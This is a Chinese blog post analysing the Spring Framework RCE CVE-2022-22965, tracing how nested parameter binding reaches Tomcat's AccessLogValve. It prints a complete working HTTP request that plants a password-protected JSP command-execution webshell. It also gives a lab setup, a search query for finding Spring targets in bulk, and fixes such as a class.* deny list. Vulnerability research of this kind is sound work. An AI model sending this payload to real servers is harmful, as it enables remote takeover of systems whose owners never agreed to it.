# Spring-CVE-2022-22965 学习 - 我要变超人 - 博客园

> 原文：[`www.cnblogs.com/sup3rman/p/16130424.html`](https://www.cnblogs.com/sup3rman/p/16130424.html)

### Spring-CVE-2022-22965

##### 序言

cve-2022-22965 已经公布一段时间了，可谓三月安全圈最大的瓜，同时官方也发布了通告（[`spring.io/blog/2022/03/31/spring-framework-rce-early-announcement`](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)），为了方便观看我使用了 google 翻译了一下

![image-20220410123133760](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160433339-197797289.png)

总结下官方的意思：受影响的 web 应用必须是 java9 及以上，并且应用使用 war 包部署的形式在 tomcat 上运行，对应的 Spring Framework 版本如上截图。

##### 漏洞利用条件

使用 Spring 参数绑定

jdk 版本号 >= 9

当前应用以 war 包的方式在 tomcat 上运行

##### 漏洞分析

###### 前置知识

###### Tomcat AccessLogValue

这里涉及到 Tomcat AccessLogValue，AccessLogValve 用来设置访问日志 access_log，Tomcat 的 server.xml 中默认配置了 AccessLogValve，所有部署在 Tomcat 中的 Web 应用均会执行该 Valve。

![image-20220410120801493](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160434140-743247110.png)

可以看到其 Valve 标签中的属性：

suffix：后缀

directory：日志输出位置

prefix：文件名前缀

pattern：文件内容格式

###### Spring 参数绑定

定义一个 BeanParam，其中有 name 属性

```
 package com.example;
 ​
 public class BeanParam {
     private String name;
 ​
     public BeanParam() {
     }
 ​
     public BeanParam(String name) {
         this.name = name;
     }
 ​
     public String getName() {
         return name;
     }
 ​
     public void setName(String name) {
         this.name = name;
     }
 ​
     @Override
     public String toString() {
         return "BeanParam{" +
                 "name='" + name + '\'' +
                 '}';
     }
 }
```

```

 ​
```

在传统的 java 中调用中需要先将 BeanParam 实例化才能调用设置其属性，在 spring 中帮我们解决了这个过程，直接调用即可

```
 package com.example;
 ​
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 ​
 @RestController
 public class TestController {
     public TestController() {
         System.out.printf("Test Init");
     }
     @RequestMapping("test")
     public Object test(BeanParam beanParam){
         return beanParam.toString();
     }
 }
```

Spring 初始化

```
 package com.example;
 ​
 import org.springframework.web.WebApplicationInitializer;
 import org.springframework.web.context.support.AnnotationConfigWebApplicationContext;
 import org.springframework.web.servlet.DispatcherServlet;
 ​
 import javax.servlet.ServletContext;
 import javax.servlet.ServletException;
 import javax.servlet.ServletRegistration;
 ​
 public class ApplicationInitializer implements WebApplicationInitializer {
     @Override
     public void onStartup(ServletContext servletContext) throws ServletException {
         AnnotationConfigWebApplicationContext ctx = new AnnotationConfigWebApplicationContext();
         ctx.register(TestController.class);
 ​
         DispatcherServlet servlet = new DispatcherServlet(ctx);
         ServletRegistration.Dynamic registration = servletContext.addServlet("openx", servlet);
         registration.setLoadOnStartup(1);
         registration.addMapping("/openx/*");
     }
 }
```

绑定过程实现过程

访问 url：[`localhost:8080/cve_2022_22965_war/openx/test?name=tom`](http://localhost:8080/cve_2022_22965_war/openx/test?name=tom)

由于整个过程较多，我们挑漏洞产生处为重点，断点处 BeanWrapperImple 的 230 行处

![image-20220410181106062](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160434692-457761336.png)

![image-20220410183751979](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160435317-892452234.png)

![image-20220410221512845](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160435889-1325681899.png)

如上图代码走进 getPropertyDescriptor 时会获取属性描述，在我们的 BeanParam 实例中实际只有 name 一个属性，而此时却出现了 class 属性，并且指向我们的 BeanParam，该漏洞就是利⽤这个 class 对象构造利⽤链，众所周知，所有 Java 对象都拥有一个 getClass()方法，获取这个对象的 Class；而 Class 对象又有 getClassLoader()方法，来获取这个 Class 的 ClassLoader；而在 Tomcat 中，一些和 Tomcat 的全局配置相关的属性都保存在`org.apache.catalina.loader.ParallelWebappClassLoader`这个 Tomcat 专属的 ClassLoader 的一些属性、子孙属性里。 那么，我们就可以通过 person.getClass().getClassLoader().getXXX()来调用 ParallelWebappClassLoader 中的一些敏感属性，最后通过修改 Tomcat 的配置来执行危险操作，最简单的方式便是利用 AccessLogValue 修改 tomcat 配置，这个利用方式最早在 CVE-2010-1622 出现过，后来官方进行了修复，而此次则是利用 jdk9 的 Class 对象中多了一个 Module 类的属性的特性，而 Module 类中也存在 getClassLoader()方法，绕过了之前的修复。利用链如下：

```
BeanParam.getClass()

java.lang.Class.getModule()

java.lang.Module.getClassLoader()

org.apache.catalina.loader.ParallelWebappClassLoader.getResources()

org.apache.catalina.webresources.StandardRoot.getContext()

org.apache.catalina.core.StandardContext.getParent()

org.apache.catalina.core.StandardHost.getPipeline()

org.apache.catalina.core.StandardPipeline.getFirst()

org.apache.catalina.valves.AccessLogValve.getPattern()

AccessLogValue.setPattern("xxxxxxx")

```

###### payload 分析

目前 github 上已公开利用脚本，我们看一下其内容

![image-20220410115844271](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160436639-830875208.png)

这里我把关键的内容摘选出来

```
 "suffix":"%>//",
 "c1":"Runtime",
 "c2":"<%",
 "DNT":"1",
 "Content-Type":"application/x-www-form-urlencoded"
 ​
 ​
```

```
 class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di
 class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
 class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
 class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
 class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

执行上述脚本之后会在 webapps/ROOT 生成一句话木马的脚本 tomcatwar.jsp，为什么会这样呢？

这里我们先分析其中一段`class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar`是怎么实现的

![image-20220410153319825](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160437237-1880529294.png)

核心的地方在 BeanWrapperImple，把类的 get，set 方法通过 BeanWrapper 使用，动态的修改 bean 的一些属性。在 BeanWrapperImpl 类 230 打断点

![image-20220410153944338](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160437784-604096776.png)

链式调用的第一步 getClass()，可以看到 spring 利用反射执行了方法 getClass

![image-20220410192041775](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160438440-671353045.png)

![image-20220410224216621](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160439191-1848855635.png)

当代码走到 AbstractNestablePropertyAccessor 类 820 处时断点

代码走到断点处可查看对我们传入的 payload 进行了怎样的处理，进入 getFirstNestedPropertySeparatorIndex 方法，从方法可以知道是用来进行分隔的，通过"["、 "]"、"."进行分隔，执行代码如下。

![image-20220410192617384](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160439804-1992125340.png)

**我们重点关注第 820 行，**AbstractNestablePropertyAccessor nestedPa = getNestedPropertyAccessor(nestedProperty);，该行主要实现每层嵌套参数的获取。我们可以通过 idea 查看每次递归解析过程中各个变量的值，以及如何获取每层嵌套参数。

递归第一次，可以看到已解析的嵌套参数 class，及接下来要解析的 module.classLoader.resources.context.parent.pipeline.first.prefix

![image-20220410224839946](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160440596-213862583.png)

接下来的步骤就不演示了，就是重复循环解析 class 的过程，如第二轮递归反射 java.lang.Class.getmodule()方法，第三轮递归 java.lang.Module.getclassLoader().....直到解析到 org.apache.catalina.core.StandardPipeline.getFirst()方法，最后通过 set 方法对 prefix 进行赋值，可以看到下图最后使用 set 方法对 oldValue 进行了重置

![image-20220410230157098](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160441349-914848755.png)

![image-20220410230131413](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160442063-791616795.png)

走到这里我们完成了第一步，即设置 tomcat 日志前缀为 tomcatwar，那同理，AccessLogAvlue 的其他属性也可以进行赋值，原理一样。

##### 漏洞利用复盘

通过上述漏洞分析，我们知道只要依次请求下面的调用链即可完成修改日志配置的目的

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

由于 pattern 中的`%`会被过滤，所以使用引用头部的方式进行构造，可以看到 c1、c2 键值对，会被带入 pattern 数据中标识占位符的地方

headers = {"suffix":"%>//", "c1":"Runtime", "c2":"<%", "DNT":"1", "Content-Type":"application/x-www-form-urlencoded"

}

整个请求包如下：

```
POST /cve_2022_22965_war/openx/test HTTP/1.1
Host: 127.0.0.1:8080
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
suffix: %>//
c1: Runtime
c2: <%DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 762

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

```

![wps815.tmp](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160442755-809667995.jpg)

执行上述 payload 之后我们会在 webapps\ROOT 下发现生成 tomcatwar.jsp 文件。

![image-20220410231139385](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160443327-131284199.png)

最后我们再访问 webshell

![image-20220410231107954](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160443920-1274601221.png)

**环境搭建**

有基础的同学可以自己搭建一个小 demo，方便调试，pom.xml 文件如下

```
<?xml version="1.0" encoding="UTF-8"?>
 <project color: rgba(139, 0, 0, 1)">http://maven.apache.org/POM/4.0.0"
          color: rgba(139, 0, 0, 1)">http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
     <modelVersion>4.0.0</modelVersion>
 ​
     <groupId>org.example</groupId>
     <artifactId>cve-2022-22965</artifactId>
     <version>1.0-SNAPSHOT</version>
     <packaging>war</packaging>
 ​
     <properties>
         <maven.compiler.source>9</maven.compiler.source>
         <maven.compiler.target>9</maven.compiler.target>
     </properties>
 ​
     <dependencies>
         <dependency>
             <groupId>javax.servlet</groupId>
             <artifactId>javax.servlet-api</artifactId>
             <version>4.0.1</version>
             <scope>provided</scope>
         </dependency>
         <dependency>
             <groupId>org.springframework</groupId>
             <artifactId>spring-context</artifactId>
             <version>5.3.17</version>
         </dependency>
         <dependency>
             <groupId>org.springframework</groupId>
             <artifactId>spring-webmvc</artifactId>
             <version>5.3.17</version>
         </dependency>
     </dependencies>
 ​
     <build>
         <plugins>
             <plugin>
                 <groupId>org.apache.maven.plugins</groupId>
                 <artifactId>maven-site-plugin</artifactId>
                 <version>3.3</version>
             </plugin>
         </plugins>
     </build>
 ​
 </project>
```

代码直接使用 Spring 参数绑定处介绍的三段代码即可

![image-20220411143108501](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160444533-1259439364.png)

没有基础的可以直接使用 docker 起一个相关应用服务

docker 命令如下： docker pull vulfocus/spring-core-rce-2022-03-29 docker run -p 9090:8080 vulfocus/spring-core-rce-2022-03-29

不过在最后复盘的时候还是要强调一点，修改 tomcat 日志配置之后所有的访问日志都会记录到该 jsp 文件中，实际利用中如果项目不重启该配置或删除该文件，文件则会越来越大，存在 DOS 风险。当然，目前已知的利用方式是通过修改 tomcat 日志完成 rce，或许有别的地方可以 RCE，不仅仅只限于 tomcat，所以项目应用尽早修复到官方指定版本。

##### 批量利用思路

github 已经公开了批量漏洞利用脚本，可以通过 fofa、hunter 等平台批量搜索 spring 资产，但极其不建议在不清楚漏洞危害的情况下刷漏洞，原因如上，存在 DOS 风险。

如 hunter 的语法：web.icon=="0488faca4c19046b94d07c3ee83cf9d6"

![image-20220411144235217](https://img2022.cnblogs.com/blog/1943028/202204/1943028-20220411160445075-121620237.png)

##### 漏洞修复

1、升级到当前最新 Spring Framework 版本

2、升级 Tomcat，在此次漏洞之后 tomcat 也做出相应调整，升级到 10.0.20、9.0.62、8.5.78 版本

3、降级 JDK 版本到 java8

4、通过全局设置来禁用某些特定字段

```
 @ControllerAdvice
 @Order(Ordered.LOWEST_PRECEDENCE)
 public class BinderControllerAdvice {
 ​
     @InitBinder
     public void setAllowedFields(WebDataBinder dataBinder) {
          String[] denylist = new String[]{"class.*", "Class.*", "*.class.*", "*.Class.*"};
          dataBinder.setDisallowedFields(denylist);
    }
 ​
 }
```